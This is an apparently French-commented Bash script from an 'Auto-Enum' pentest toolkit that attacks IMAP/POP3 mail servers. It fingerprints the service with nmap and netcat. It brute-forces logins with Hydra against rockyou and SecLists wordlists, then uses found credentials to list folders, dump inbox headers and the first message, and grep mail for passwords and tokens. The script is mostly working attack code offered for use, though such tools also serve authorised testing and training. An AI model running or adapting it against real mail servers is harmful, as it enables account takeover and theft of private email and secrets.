#!/usr/bin/env bash
# ╔══════════════════════════════════════════╗
# ║   Auto-Enum — IMAP/POP3 (143/993/110/995)║
# ║   Usage: ./enum_imap.sh <TARGET> [USER] [PASS]
# ╚══════════════════════════════════════════╝
source "$(dirname "$0")/lib/common.sh"

TARGET="$1"
USER="${2:-}"
PASS="${3:-}"

require_target "$TARGET"
banner "IMAP / POP3 (143/993/110/995)" "$TARGET"
OUTDIR=$(setup_outdir "$TARGET" "imap")

# ─── 1. FINGERPRINT ─────────────────────────────────────────
section "1. FINGERPRINT"

run "Nmap — IMAP/POP3 scripts" "$OUTDIR/nmap_mail.txt" \
    nmap -sV -sC "$TARGET" -p110,143,993,995 \
    --script imap-capabilities,imap-ntlm-info,pop3-capabilities,pop3-ntlm-info \
    -oN "$OUTDIR/nmap_mail_raw.txt"

# Banner grabbing manuel
for PORT in 110 143; do
    info "Banner grab port $PORT"
    timeout 8 nc -vn "$TARGET" "$PORT" <<< "QUIT" 2>&1 | tee "$OUTDIR/banner_${PORT}.txt"
done

# Extraire serveur
MAIL_SERVER=$(grep -oP '(Dovecot|Courier|Cyrus|Exchange|hMailServer|UW-IMAP|ProFTPD)[^\n]*' \
    "$OUTDIR/nmap_mail.txt" "$OUTDIR/banner_110.txt" "$OUTDIR/banner_143.txt" 2>/dev/null | head -1)
[[ -n "$MAIL_SERVER" ]] && finding "Serveur : $MAIL_SERVER"

# Ports ouverts
IMAP_PORT=""
POP3_PORT=""
grep -q "143/tcp.*open" "$OUTDIR/nmap_mail.txt" 2>/dev/null && IMAP_PORT="143"
grep -q "993/tcp.*open" "$OUTDIR/nmap_mail.txt" 2>/dev/null && IMAP_PORT="${IMAP_PORT:-993}"
grep -q "110/tcp.*open" "$OUTDIR/nmap_mail.txt" 2>/dev/null && POP3_PORT="110"
grep -q "995/tcp.*open" "$OUTDIR/nmap_mail.txt" 2>/dev/null && POP3_PORT="${POP3_PORT:-995}"

[[ -n "$IMAP_PORT" ]] && success "IMAP sur le port $IMAP_PORT"
[[ -n "$POP3_PORT" ]] && success "POP3 sur le port $POP3_PORT"

# Capabilities
info "IMAP Capabilities"
(echo "A001 CAPABILITY"; sleep 1; echo "A002 LOGOUT") | \
    timeout 8 nc -vn "$TARGET" "${IMAP_PORT:-143}" 2>&1 | tee "$OUTDIR/imap_caps.txt"

# ─── 2. BRUTE FORCE ─────────────────────────────────────────
section "2. BRUTE FORCE AUTHENTIFICATION"

USERLIST=""
for wl in \
    "/usr/share/seclists/Usernames/top-usernames-shortlist.txt" \
    "/usr/share/wordlists/metasploit/unix_users.txt"; do
    [[ -f "$wl" ]] && USERLIST="$wl" && break
done

[[ -z "$USERLIST" ]] && {
    cat > /tmp/imap_users.txt << 'EOF'
admin
root
mail
postmaster
user
info
support
test
webmaster
EOF
    USERLIST="/tmp/imap_users.txt"
}

> "$OUTDIR/valid_creds.txt"

if [[ -n "$USER" && -n "$PASS" ]]; then
    info "Test credentials : $USER:$PASS"

    # Test IMAP
    if [[ -n "$IMAP_PORT" ]]; then
        if [[ "$IMAP_PORT" == "993" ]]; then
            IMAP_RESULT=$(timeout 10 openssl s_client -connect "${TARGET}:993" -quiet <<< \
                "A001 LOGIN $USER $PASS
A002 LIST \"\" \"*\"
A003 LOGOUT" 2>&1)
        else
            IMAP_RESULT=$(timeout 10 nc -vn "$TARGET" 143 <<< \
                "A001 LOGIN $USER $PASS
A002 LIST \"\" \"*\"
A003 LOGOUT" 2>&1)
        fi
        echo "$IMAP_RESULT" | tee "$OUTDIR/imap_auth.txt"
        if echo "$IMAP_RESULT" | grep -q "A001 OK\|LOGIN completed"; then
            success "IMAP AUTH RÉUSSIE !"
            echo "$USER:$PASS" >> "$OUTDIR/valid_creds.txt"
        fi
    fi

    # Test POP3
    if [[ -n "$POP3_PORT" ]]; then
        if [[ "$POP3_PORT" == "995" ]]; then
            POP3_RESULT=$(timeout 10 openssl s_client -connect "${TARGET}:995" -quiet <<< \
                "USER $USER
PASS $PASS
LIST
QUIT" 2>&1)
        else
            POP3_RESULT=$(timeout 10 nc -vn "$TARGET" 110 <<< \
                "USER $USER
PASS $PASS
LIST
QUIT" 2>&1)
        fi
        echo "$POP3_RESULT" | tee "$OUTDIR/pop3_auth.txt"
        if echo "$POP3_RESULT" | grep -q "+OK.*logged\|+OK.*Logged\|+OK Maildrop"; then
            success "POP3 AUTH RÉUSSIE !"
            echo "$USER:$PASS (POP3)" >> "$OUTDIR/valid_creds.txt"
        fi
    fi
fi

# Hydra brute force
if [[ ! -s "$OUTDIR/valid_creds.txt" ]] && check_tool hydra; then
    PASSLIST=""
    for wl in \
        "/usr/share/seclists/Passwords/Common-Credentials/10k-most-common.txt" \
        "/usr/share/wordlists/rockyou.txt"; do
        [[ -f "$wl" ]] && PASSLIST="$wl" && break
    done

    if [[ -n "$USER" && -n "$PASSLIST" ]]; then
        info "Hydra brute force IMAP"
        run_long "Hydra IMAP" "$OUTDIR/hydra_imap.txt" 90 \
            hydra -l "$USER" -P "$PASSLIST" -t 4 imap://"$TARGET"

        grep "login:\|password:" "$OUTDIR/hydra_imap.txt" 2>/dev/null | \
            tee -a "$OUTDIR/valid_creds.txt"
    elif [[ -n "$PASSLIST" ]]; then
        info "Hydra brute force avec liste d'users"
        run_long "Hydra IMAP multi-user" "$OUTDIR/hydra_imap.txt" 90 \
            hydra -L "$USERLIST" -P "$PASSLIST" -t 4 imap://"$TARGET"
        grep "login:\|password:" "$OUTDIR/hydra_imap.txt" 2>/dev/null | \
            tee -a "$OUTDIR/valid_creds.txt"
    fi
fi

# ─── 3. ENUM MAILBOX ────────────────────────────────────────
if [[ -s "$OUTDIR/valid_creds.txt" ]]; then
    VALID_LINE=$(head -1 "$OUTDIR/valid_creds.txt")
    V_USER="${VALID_LINE%%:*}"
    V_PASS="${VALID_LINE##*:}"

    section "3. ENUM MAILBOX ($V_USER)"

    # Lister les dossiers IMAP
    if [[ -n "$IMAP_PORT" ]]; then
        info "Liste des dossiers IMAP"
        if [[ "$IMAP_PORT" == "993" ]]; then
            FOLDER_CMD="openssl s_client -connect ${TARGET}:993 -quiet"
        else
            FOLDER_CMD="nc -vn $TARGET 143"
        fi

        eval "$FOLDER_CMD" <<< "A001 LOGIN $V_USER $V_PASS
A002 LIST \"\" \"*\"
A003 LOGOUT" 2>&1 | tee "$OUTDIR/imap_folders.txt"

        # Extraire noms des dossiers
        FOLDERS=$(grep -oP '"[^"]*"\s*$' "$OUTDIR/imap_folders.txt" 2>/dev/null | tr -d '"' | sort -u)

        if [[ -n "$FOLDERS" ]]; then
            success "Dossiers IMAP trouvés :"
            echo "$FOLDERS"

            # Lire les mails dans INBOX
            info "Lecture INBOX (10 premiers messages)"
            eval "$FOLDER_CMD" <<< "A001 LOGIN $V_USER $V_PASS
A002 SELECT INBOX
A003 FETCH 1:10 (BODY[HEADER.FIELDS (FROM TO SUBJECT DATE)])
A004 LOGOUT" 2>&1 | tee "$OUTDIR/inbox_headers.txt"

            # Chercher credentials dans les mails
            grep -iE "password|pass|secret|credential|token|key" \
                "$OUTDIR/inbox_headers.txt" 2>/dev/null | \
                tee "$OUTDIR/creds_in_mails.txt"

            if [[ -s "$OUTDIR/creds_in_mails.txt" ]]; then
                finding "Credentials potentiels dans les mails !"
                echo "CREDS_IN_EMAILS" >> "$OUTDIR/findings.txt"
            fi

            # Dump complet premier mail
            info "Contenu du premier mail"
            eval "$FOLDER_CMD" <<< "A001 LOGIN $V_USER $V_PASS
A002 SELECT INBOX
A003 FETCH 1 BODY[]
A004 LOGOUT" 2>&1 | head -100 | tee "$OUTDIR/first_mail.txt"
        fi
    fi

    # POP3 enum
    if [[ -n "$POP3_PORT" ]]; then
        info "Listing mails POP3"
        if [[ "$POP3_PORT" == "995" ]]; then
            eval "openssl s_client -connect ${TARGET}:995 -quiet" <<< \
                "USER $V_USER
PASS $V_PASS
LIST
RETR 1
QUIT" 2>&1 | tee "$OUTDIR/pop3_mails.txt"
        else
            nc -vn "$TARGET" 110 <<< "USER $V_USER
PASS $V_PASS
LIST
RETR 1
QUIT" 2>&1 | tee "$OUTDIR/pop3_mails.txt"
        fi
    fi
fi

# ─── 4. VULNÉRABILITÉS ──────────────────────────────────────
section "4. VULNÉRABILITÉS"

if [[ -n "$MAIL_SERVER" ]] && check_tool searchsploit; then
    run "Searchsploit" "$OUTDIR/searchsploit.txt" \
        searchsploit "$MAIL_SERVER" --colour
fi

# ─── SUMMARY ────────────────────────────────────────────────
summary "$OUTDIR"

echo -e "${WHITE}━━━ RÉSUMÉ RAPIDE ━━━${NC}"
[[ -n "$MAIL_SERVER" ]] && info "Serveur : $MAIL_SERVER"
[[ -n "$IMAP_PORT" ]] && info "IMAP port : $IMAP_PORT"
[[ -n "$POP3_PORT" ]] && info "POP3 port : $POP3_PORT"

[[ -s "$OUTDIR/valid_creds.txt" ]] && {
    echo ""
    success "Credentials valides :"
    cat "$OUTDIR/valid_creds.txt"
}

[[ -s "$OUTDIR/findings.txt" ]] && {
    echo ""
    warn "FINDINGS IMPORTANTS :"
    cat "$OUTDIR/findings.txt"
}
